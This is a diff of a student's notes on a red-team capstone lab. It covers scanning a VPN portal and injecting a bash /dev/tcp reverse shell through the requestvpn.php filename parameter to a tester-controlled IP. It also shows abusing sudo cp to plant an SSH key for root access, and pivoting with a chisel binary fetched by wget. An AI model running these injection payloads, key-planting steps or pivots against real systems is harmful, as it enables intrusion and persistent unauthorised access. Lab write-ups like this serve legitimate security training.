@@ -1,5 +1,7 @@
 ****
 Red Team Capstone Challenge
+SSH key Gen + Add our Public key in VPN Machine
+Pivoting Chisel: https://github.com/jpillora/chisel/releases
 ****
 
  
@@ -105,56 +107,8 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
 
 
 
-    -VPN:
-        nmap -T3 -sV -sC -Pn 10.200.116.12 -vv
-        PORT   STATE SERVICE REASON  VERSION
-        22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-        | ssh-hostkey: 
-        |   2048 9d:4a:c1:da:bd:1a:14:7d:0e:f7:1f:67:2a:db:b9:f9 (RSA)
-        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kZUmhU3bS2taxQ+3B/2eCYbI7JdNhuiHEXJOHd8/McZODtoiA9dMIvpF+nB9AHTDD473lmwI8ulxH98xo1dY9ZFYVRptk13poDgv4FEusxTUTgziYnSPci3EQDU0wdxYuCCrv4PxxJxXtxgORV1SwTqQmSIuPKLr5F2hQygus1JEDBl/VoNs+8hLvuQzw4cLcp0tXSjdpucnxbdeR1WCY4dkYl6h5PbqMgU7+7hV6dhPqdJn4c6Q6u7y2+8wJrDak6wGW8P6Q311JVIBJMOYzTdGOEWyEoitD0Quhf48RecFaAUlr2rSXPY1oiDvs6+dpdjfbrx9UZ+3PBKREScj
-        |   256 31:e8:21:49:0a:78:ad:a1:ee:c9:a9:4d:64:8b:eb:c3 (ECDSA)
-        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMafzsJe5MJ+389may9eYT211+iXzw/PzwYstR2wcpRo60B02edEVjpnBQPQkKIszHURJhR+Go34UF/pAC8hpGo=
-        |   256 53:17:b3:7d:5b:13:9a:e3:fd:e7:b9:c5:e0:b9:09:6d (ED25519)
-        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1fECbjy8OmaHJib34Nxv4YpkMBPsjm3eD+zjGc3K5u
-        80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
-        |_http-title: VPN Request Portal
-        |_http-server-header: Apache/2.4.29 (Ubuntu)
-        | http-methods: 
-        |_  Supported Methods: GET HEAD POST OPTIONS
-        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-
-        Port 80:
-            └─$ gobuster dir -u http://10.200.116.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-                http://10.200.116.12/vpn/
-
-                We Found /etc/passwd + OVPN config file
-                We add the VPN IP Machine into the ovpn file
-
-                sudo openvpn corpUsername.ovpn
-
-            WE GET ACCESS TO THE INTERNAL NETWORK !!!!!
-
-            In the Openvpn corpUsername.com we found:
-                10.200.116.21
-                10.200.116.22
-
-
-        Exploit VPN Machine:
-            in the VPN Page via BurpSuite: 
-            http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell:
-                pentenst monkey reverse shell -> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-
-            We will add the reverse shell here:
-                GET /requestvpn.php?filename=test HTTP/1.1
-                test && /bin/bash -i >& /dev/tcp/<Tunnel IP>443 0>&1
-
-            We use the repeater in Burp Suite:
-                We finally get a reverse shell and we found DB creds
-
-            Easiest way we add the payload in the from:
-                Account: test && /bin/bash -i >& /dev/tcp/<Tunnel IP>/443 0>&1
-                nc -lvnp 443
+    
+                       
 
 
     -Internal Network IP 10.200.116.21:
@@ -353,3 +307,144 @@ add:  http://swift.bank.thereserve.loc/ in etc/hosts with Web Server IP
 
     in the VPN Page via BurpSuite: 
         http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell 
+
+
+    -VPN:
+        nmap -T3 -sV -sC -Pn 10.200.116.12 -vv
+        PORT   STATE SERVICE REASON  VERSION
+        22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+        | ssh-hostkey: 
+        |   2048 9d:4a:c1:da:bd:1a:14:7d:0e:f7:1f:67:2a:db:b9:f9 (RSA)
+        | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kZUmhU3bS2taxQ+3B/2eCYbI7JdNhuiHEXJOHd8/McZODtoiA9dMIvpF+nB9AHTDD473lmwI8ulxH98xo1dY9ZFYVRptk13poDgv4FEusxTUTgziYnSPci3EQDU0wdxYuCCrv4PxxJxXtxgORV1SwTqQmSIuPKLr5F2hQygus1JEDBl/VoNs+8hLvuQzw4cLcp0tXSjdpucnxbdeR1WCY4dkYl6h5PbqMgU7+7hV6dhPqdJn4c6Q6u7y2+8wJrDak6wGW8P6Q311JVIBJMOYzTdGOEWyEoitD0Quhf48RecFaAUlr2rSXPY1oiDvs6+dpdjfbrx9UZ+3PBKREScj
+        |   256 31:e8:21:49:0a:78:ad:a1:ee:c9:a9:4d:64:8b:eb:c3 (ECDSA)
+        | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMafzsJe5MJ+389may9eYT211+iXzw/PzwYstR2wcpRo60B02edEVjpnBQPQkKIszHURJhR+Go34UF/pAC8hpGo=
+        |   256 53:17:b3:7d:5b:13:9a:e3:fd:e7:b9:c5:e0:b9:09:6d (ED25519)
+        |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1fECbjy8OmaHJib34Nxv4YpkMBPsjm3eD+zjGc3K5u
+        80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+        |_http-title: VPN Request Portal
+        |_http-server-header: Apache/2.4.29 (Ubuntu)
+        | http-methods: 
+        |_  Supported Methods: GET HEAD POST OPTIONS
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+        Port 80:
+            └─$ gobuster dir -u http://10.200.116.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+                http://10.200.116.12/vpn/
+
+                We Found /etc/passwd + OVPN config file
+                We add the VPN IP Machine into the ovpn file
+
+                sudo openvpn corpUsername.ovpn
+
+            WE GET ACCESS TO THE INTERNAL NETWORK !!!!!
+
+            In the Openvpn corpUsername.com we found:
+                10.200.116.21
+                10.200.116.22
+
+
+            Exploit VPN Machine:
+                in the VPN Page via BurpSuite: 
+                http://10.200.116.12/vpncontrol.php we will try to modify the url and get a remote shell:
+                    pentenst monkey reverse shell -> bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+                We will add the reverse shell here:
+                    GET /requestvpn.php?filename=test HTTP/1.1
+                    test && /bin/bash -i >& /dev/tcp/<Tunnel IP>443 0>&1
+
+                We use the repeater in Burp Suite:
+                    We finally get a reverse shell and we found DB creds
+
+                Easiest way we add the payload in the from:
+                    Account: test && /bin/bash -i >& /dev/tcp/10.50.113.14/443 0>&1
+                    nc -lvnp 443
+
+                Enumeration:
+                    Sudo version 1.8.21p2   
+                    sudo -l:
+                        "it show us that we can check in file via" /bin/cp
+                        sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout
+                        We have the Authorized key
+                        We also find root password
+
+                        In Kali:
+                            ssh-keygen -t rsa
+                            we cat in the right file path 'id_rsa.pub'
+
+                        We will add OUR RSA key to the Compromise Machine (vpnMachine):
+                            LFILE=/home/ubuntu/.ssh/authorized_keys                        
+                            echo "ssh-rsa <our public key>" | sudo /bin/cp /dev/stdin "$LFILE"
+
+
+                        In Kali:
+                            ssh ubuntu@10.200.116.12 -i /home/kali/.ssh/id_rsa
+                            ssh -D950 ubuntu@10.200.116.12 (reconnect)
+
+                        Ubuntu SHell:
+                            sudo -su root:
+                            @root
+
+                From this machine we try nmap on other INTERNAL SERVERS it Works (I had to make the scan LESSS NOISY)
+
+                root@ip-10-200-116-12:/root# nmap -Pn -sV -sC 10.200.116.31
+                    Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-02 01:08 UTC
+                    Nmap scan report for ip-10-200-116-31.eu-west-1.compute.internal (10.200.116.31)
+                    Host is up (0.00035s latency).
+                    Not shown: 995 filtered ports
+                    PORT     STATE SERVICE       VERSION
+                    22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+                    135/tcp  open  msrpc         Microsoft Windows RPC
+                    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+                    445/tcp  open  microsoft-ds?
+                    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+                    ssl-cert: Subject: commonName=SERVER1.corp.thereserve.loc
+                    ...
+                    Host script results:
+                    | smb2-security-mode: 
+                    |   2.02: 
+                    |_    Message signing enabled but not required
+                    | smb2-time: 
+                    |   date: 2024-05-02 01:08:49
+                    |_  start_date: 1601-01-01 00:00:00
+
+
+            Pivoting with Chisel (Perform a successfull Nmap scan from Kali by passing through the COMPROMISE VPNMACHINE):
+                In compromise Machine:
+                    root@ip-10-200-116-12:/home# mkdir adib
+                    root@ip-10-200-116-12:/home# ls
+                    adib  ubuntu
+                    root@ip-10-200-116-12:/home# cd adib
+                    root@ip-10-200-116-12:/home/adib# 
+
+                In Kali:
+                    sudo python3 -m http.server
+                    add the chisel bynari for linux:
+                        https://github.com/jpillora/chisel/releases
+
+                In Machine:
+                    root@ip-10-200-116-12:/home/adib# wget http://10.50.113.14:8000/chisel
+                    root@ip-10-200-116-12:/home/adib# chmod +x chisel
+                                
+
+                In Kali:
+                    chisel server -p 8000 -reverse
+
+                In Machine:
+                    root@ip-10-200-116-12:/home/adib# ./chisel client <KaliIP:PORT> R:socks
+
+                In Kali:
+                proxychains nmap -sT -Pn 10.200.116.32
+                PORT     STATE SERVICE       VERSION
+                22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+                ..
+                135/tcp  open  msrpc         Microsoft Windows RPC
+                139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+                3389/tcp open  ms-wbt-server Microsoft Terminal Services
+                | ssl-cert: Subject: commonName=SERVER2.corp.thereserve.loc
+                | Not valid before: 2024-04-08T18:12:35
+                |_Not valid after:  2024-10-08T18:12:35
+                |_ssl-date: 2024-05-02T01:56:00+00:00; -1s from scanner time.
+                MAC Address: 02:EF:07:A0:8C:8F (Unknown)
+                Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
